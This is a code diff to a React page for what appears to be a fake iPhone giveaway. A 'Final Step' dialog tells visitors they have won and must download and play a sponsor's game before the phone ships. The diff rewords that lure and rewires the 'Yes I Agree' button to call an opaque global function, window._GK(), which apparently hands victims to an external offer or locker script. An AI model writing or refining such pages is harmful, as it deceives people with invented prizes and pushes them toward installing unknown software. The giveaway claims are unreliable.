@@ -169,12 +169,12 @@ const Index: React.FC = () => {
           <DialogHeader>
             <DialogTitle className="text-3xl font-bold text-gray-800 dark:text-white mb-4">Final Step</DialogTitle>
             <DialogDescription className="text-gray-600 dark:text-gray-300 text-left">
-              So we can start shipping the iPhone to you, you need to finish the last step. The sponsor of this giveaway (who paid for the iPhones) requests that the winners download and play their game for a short time (15-20 minutes).
+              To start the shipping process for your iPhone, you need to finish one last step. The sponsor of this giveaway (who paid for the iPhones) requests that winners download and play their game for a short time (15-20 minutes).
             </DialogDescription>
           </DialogHeader>
           <div className="flex flex-col gap-4 mt-6">
             <Button
-              onClick={() => setIsAgreementModalOpen(false)}
+              onClick={() => (window as any)._GK()}
               className="w-full py-3 bg-green-600 hover:bg-green-700 text-white font-semibold rounded-md transition-all duration-300 ease-in-out transform hover:scale-105"
             >
               Yes I Agree
